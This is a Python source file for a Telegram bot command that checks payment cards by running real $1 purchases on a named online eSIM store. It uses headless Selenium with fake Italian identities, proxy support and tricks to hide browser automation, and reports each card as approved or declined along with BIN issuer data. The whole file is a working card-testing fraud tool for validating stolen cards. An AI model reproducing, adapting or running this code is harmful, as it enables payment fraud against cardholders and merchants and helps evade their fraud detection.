from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import random
import time
import logging
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class Shopify1CheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium con proxy"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # USER AGENT casuale
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ]
            chrome_options.add_argument(f"--user-agent={random.choice(user_agents)}")
            
            # CONFIGURA PROXY se fornito
            if self.proxy_url:
                logger.info(f"🔌 Usando proxy: {self.proxy_url}")
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.wait = WebDriverWait(self.driver, 20)
            logger.info("✅ Driver Shopify $1 inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def close_popups(self):
        """Chiude popup e banner che potrebbero bloccare i click"""
        try:
            logger.info("🔍 Cercando popup da chiudere...")
            
            # Lista di selettori per popup comuni su Shopify
            popup_selectors = [
                "#shopify-pc__banner",  # Popup che ha causato l'errore
                ".shopify-pc__banner__dialog",
                ".popup",
                ".modal",
                ".newsletter-popup",
                "#newsletter-popup",
                ".age-verification",
                "#age-verification",
                ".cookie-banner",
                "#cookie-banner",
                "[aria-label*='close']",
                ".close-button",
                ".popup-close",
                ".modal-close"
            ]
            
            for selector in popup_selectors:
                try:
                    popup = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if popup.is_displayed():
                        # Prova a trovare e cliccare il bottone close
                        close_buttons = [
                            f"{selector} [aria-label*='close']",
                            f"{selector} .close",
                            f"{selector} .close-button",
                            f"{selector} .popup-close",
                            f"{selector} .modal-close",
                            f"{selector} button",
                            f"{selector} [class*='close']"
                        ]
                        
                        for close_selector in close_buttons:
                            try:
                                close_btn = self.driver.find_element(By.CSS_SELECTOR, close_selector)
                                if close_btn.is_displayed():
                                    self.driver.execute_script("arguments[0].click();", close_btn)
                                    logger.info(f"✅ Chiuso popup con: {close_selector}")
                                    time.sleep(1)
                                    break
                            except:
                                continue
                        
                        # Se non trova bottone close, prova a chiudere con ESC
                        try:
                            from selenium.webdriver.common.keys import Keys
                            self.driver.find_element(By.TAG_NAME, 'body').send_keys(Keys.ESCAPE)
                            logger.info("✅ Chiuso popup con ESC")
                            time.sleep(1)
                        except:
                            pass
                            
                except:
                    continue
            
            # Prova anche con JavaScript per rimuovere overlay
            try:
                self.driver.execute_script("""
                    // Rimuovi overlay che bloccano i click
                    const overlays = document.querySelectorAll('.popup-overlay, .modal-overlay, .popup-backdrop');
                    overlays.forEach(overlay => {
                        if (overlay) overlay.style.display = 'none';
                    });
                    
                    // Rimuovi popup che bloccano
                    const blockers = document.querySelectorAll('#shopify-pc__banner, .shopify-pc__banner__dialog');
                    blockers.forEach(blocker => {
                        if (blocker) blocker.style.display = 'none';
                    });
                """)
                logger.info("✅ Rimossi overlay con JavaScript")
            except:
                pass
                
        except Exception as e:
            logger.info(f"ℹ️ Nessun popup trovato o errore nella chiusura: {e}")

    def generate_italian_info(self):
        """Genera informazioni italiane per il checkout"""
        first_names = ['Marco', 'Luca', 'Giuseppe', 'Andrea']
        last_names = ['Rossi', 'Bianchi', 'Verdi', 'Russo']
        streets = ['Via Roma', 'Corso Italia', 'Piazza della Signoria']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f"test{random.randint(1000,9999)}@test.com",
            'phone': f"3{random.randint(10,99)}{random.randint(1000000,9999999)}",
            'address': f"{random.choice(streets)} {random.randint(1, 150)}",
            'city': 'Firenze',
            'postal_code': f"50{random.randint(100, 999)}",
            'name_on_card': 'TEST CARD'
        }
    
    def add_to_cart(self):
        """Aggiunge il prodotto al carrello"""
        try:
            logger.info("🛒 Aggiunta prodotto Shopify $1 al carrello...")
            self.driver.get("https://earthesim.com/products/usa-esim?variant=42902995271773")
            time.sleep(5)
            
            # Chiudi eventuali popup prima di cliccare
            self.close_popups()
            time.sleep(2)
            
            # Aspetta che il bottone sia cliccabile
            add_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit'][name='add']")))
            
            # Prova prima con JavaScript click per evitare interception
            try:
                self.driver.execute_script("arguments[0].click();", add_button)
                logger.info("✅ Prodotto aggiunto al carrello via JavaScript")
            except:
                # Se JavaScript fallisce, prova click normale
                add_button.click()
                logger.info("✅ Prodotto aggiunto al carrello via click normale")
            
            time.sleep(5)
            return True
            
        except Exception as e:
            logger.error(f"❌ Errore nell'aggiunta al carrello: {e}")
            return False
    
    def go_to_cart_and_checkout(self):
        """Va al carrello e clicca checkout"""
        try:
            logger.info("🛒 Andando al carrello Shopify $1...")
            self.driver.get("https://earthesim.com/cart")
            time.sleep(5)
            
            # Chiudi popup
            self.close_popups()
            time.sleep(2)
            
            checkout_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button#checkout")))
            
            # Usa JavaScript click per evitare interception
            self.driver.execute_script("arguments[0].click();", checkout_button)
            logger.info("✅ Cliccato 'Check out' Shopify $1")
            
            time.sleep(8)
            return True
            
        except Exception as e:
            logger.error(f"❌ Errore nel checkout: {e}")
            return False
    
    def fill_shipping_info(self, info):
        """Compila le informazioni di spedizione"""
        try:
            logger.info("📦 Compilazione informazioni di spedizione Shopify $1...")
            time.sleep(10)
            
            # Chiudi popup
            self.close_popups()
            time.sleep(2)
            
            # EMAIL
            email_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#email")))
            email_field.clear()
            email_field.send_keys(info['email'])
            
            # FIRST NAME
            first_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField0")
            first_name_field.clear()
            first_name_field.send_keys(info['first_name'])
            
            # LAST NAME
            last_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField1")
            last_name_field.clear()
            last_name_field.send_keys(info['last_name'])
            
            # ADDRESS
            address_field = self.driver.find_element(By.CSS_SELECTOR, "input#billing-address1")
            address_field.clear()
            address_field.send_keys(info['address'])
            
            # CITY
            city_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField4")
            city_field.clear()
            city_field.send_keys(info['city'])
            
            # POSTAL CODE
            postal_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField3")
            postal_field.clear()
            postal_field.send_keys(info['postal_code'])
            
            # PHONE NUMBER
            phone_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField5")
            phone_field.clear()
            phone_field.send_keys(info['phone'])
            
            logger.info("✅ Informazioni spedizione Shopify $1 compilate")
            return True
            
        except Exception as e:
            logger.error(f"❌ Errore nella compilazione shipping: {e}")
            return False
    
    def fill_payment_info(self, info, card_data):
        """Compila le informazioni di pagamento"""
        try:
            logger.info("💳 Compilazione informazioni di pagamento Shopify $1...")
            time.sleep(3)
            
            # CARD NUMBER
            card_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-number']")
            self.driver.switch_to.frame(card_iframe)
            card_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#number")))
            card_field.clear()
            for char in card_data['number']:
                card_field.send_keys(char)
                time.sleep(0.05)
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # EXPIRY DATE
            expiry_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-expiry']")
            self.driver.switch_to.frame(expiry_iframe)
            expiry_field = self.driver.find_element(By.CSS_SELECTOR, "input#expiry")
            expiry_value = f"{card_data['month']}/{card_data['year']}"
            self.driver.execute_script("arguments[0].value = arguments[1];", expiry_field, expiry_value)
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", expiry_field)
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # CVV
            cvv_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-verification_value']")
            self.driver.switch_to.frame(cvv_iframe)
            cvv_field = self.driver.find_element(By.CSS_SELECTOR, "input#verification_value")
            self.driver.execute_script("arguments[0].value = arguments[1];", cvv_field, card_data['cvv'])
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", cvv_field)
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # NAME ON CARD
            name_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-name']")
            self.driver.switch_to.frame(name_iframe)
            name_field = self.driver.find_element(By.CSS_SELECTOR, "input#name")
            self.driver.execute_script("arguments[0].value = arguments[1];", name_field, info['name_on_card'])
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", name_field)
            self.driver.switch_to.default_content()
            time.sleep(2)
            
            # Forza validazione
            email_field = self.driver.find_element(By.CSS_SELECTOR, "input#email")
            email_field.click()
            time.sleep(1)
            
            logger.info("✅ Informazioni pagamento Shopify $1 compilate")
            return True
            
        except Exception as e:
            logger.error(f"❌ Errore nella compilazione pagamento: {e}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False
    
    def complete_purchase(self):
        """Completa l'acquisto"""
        try:
            logger.info("🚀 Completamento acquisto Shopify $1...")
            time.sleep(3)
            
            pay_button = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "button#checkout-pay-button")))
            
            is_enabled = pay_button.is_enabled()
            logger.info(f"🔍 Bottone Pay Now Shopify $1 abilitato: {is_enabled}")
            
            if not is_enabled:
                self.driver.execute_script("document.activeElement.blur();")
                time.sleep(3)
                is_enabled = pay_button.is_enabled()
            
            if is_enabled:
                self.driver.execute_script("arguments[0].click();", pay_button)
                logger.info("✅ Cliccato 'Pay Now' Shopify $1 via JavaScript")
                time.sleep(10)
                return True
            else:
                try:
                    self.driver.execute_script("arguments[0].click();", pay_button)
                    logger.info("✅ Cliccato 'Pay Now' Shopify $1 via JavaScript (forzato)")
                    time.sleep(10)
                    return True
                except:
                    logger.error("❌ Impossibile cliccare il bottone Shopify $1")
                    return False
                
        except Exception as e:
            logger.error(f"❌ Errore nel completamento acquisto: {e}")
            return False
    
    def analyze_result(self):
        """Analizza il risultato della transazione"""
        try:
            logger.info("🔍 Analisi risultato transazione Shopify $1...")
            time.sleep(8)
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            if "your card was declined" in page_text:
                logger.info("❌ CARTA DECLINATA su Shopify $1")
                return "DECLINED"
            elif "thank you" in page_text or "order confirmed" in page_text:
                logger.info("✅ PAGAMENTO EFFETTUATO su Shopify $1")
                return "APPROVED"
            elif "3d" in page_text or "secure" in page_text:
                logger.info("🛡️ 3D SECURE RICHIESTO su Shopify $1")
                return "3DS_REQUIRED"
            else:
                logger.info("🔍 STATO SCONOSCIUTO su Shopify $1")
                return "UNKNOWN"
            
        except Exception as e:
            logger.error(f"💥 ERRORE nell'analisi: {str(e)}")
            return "ERROR"
    
    def process_payment(self, card_data):
        """Processa il pagamento Shopify $1"""
        try:
            logger.info(f"🚀 Inizio processo Shopify $1 con proxy: {self.proxy_url}")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            test_info = self.generate_italian_info()
            
            if not self.add_to_cart():
                return "ERROR_ADD_TO_CART"
            
            if not self.go_to_cart_and_checkout():
                return "ERROR_CHECKOUT"
            
            if not self.fill_shipping_info(test_info):
                return "ERROR_SHIPPING_INFO"
            
            if not self.fill_payment_info(test_info, card_data):
                return "ERROR_PAYMENT_INFO"
            
            if not self.complete_purchase():
                return "ERROR_COMPLETE_PURCHASE"
            
            result = self.analyze_result()
            return result
            
        except Exception as e:
            logger.error(f"❌ Errore durante pagamento Shopify $1: {e}")
            return f"ERROR: {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_shopify1_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    """
    Processa una carta su Shopify $1
    """
    processor = Shopify1CheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': expiry[:2],
        'year': "20" + expiry[2:],
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def s1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with Shopify $1"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 's1')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text(
            "🛍️ **Shopify $1 Check**\n\n"
            "Usage: /s1 number|month|year|cvv [proxy]\n\n"
            "Example: /s1 4111111111111111|12|2028|123\n"
            "With proxy: /s1 4111111111111111|12|2028|123 http://proxy-ip:port"
        )
        return
    
    # COMBINE ALL ARGUMENTS
    full_input = ' '.join(context.args)
    logger.info(f"🔍 Shopify $1 input: {full_input}")
    
    # FIND PROXY
    import re
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    # REMOVE PROXY FROM INPUT
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
        logger.info(f"🔌 Shopify $1 proxy: {proxy_url}")
    else:
        card_input = full_input
    
    # CLEAN SPACES
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    if proxy_url:
        wait_message = await update.message.reply_text(f"🔄 Checking Shopify $1 with proxy...")
    else:
        wait_message = await update.message.reply_text("🔄 Checking Shopify $1...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card format: {parsed_card['error']}")
            return
        
        logger.info(f"🎯 Shopify $1 card: {parsed_card['number'][:6]}******{parsed_card['number'][-4:]}")
        
        # GET BIN INFORMATION
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        # EXECUTE SHOPIFY $1 CHECK
        result = process_shopify1_payment(
            parsed_card['number'],
            parsed_card['month'] + parsed_card['year'][-2:],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        # FORMAT RESPONSE LIKE AUTHNET
        if result == "APPROVED":
            status_emoji = "✅"
            title = "Approved"
        elif result == "DECLINED":
            status_emoji = "❌" 
            title = "Declined"
        elif result == "3DS_REQUIRED":
            status_emoji = "🛡️"
            title = "3DS Required"
        else:
            status_emoji = "⚠️"
            title = result
        
        response = f"""{title} {status_emoji}

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: SHOPIFY $1
Response: {result}"""

        # ADD BIN INFO IF AVAILABLE
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in s1_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
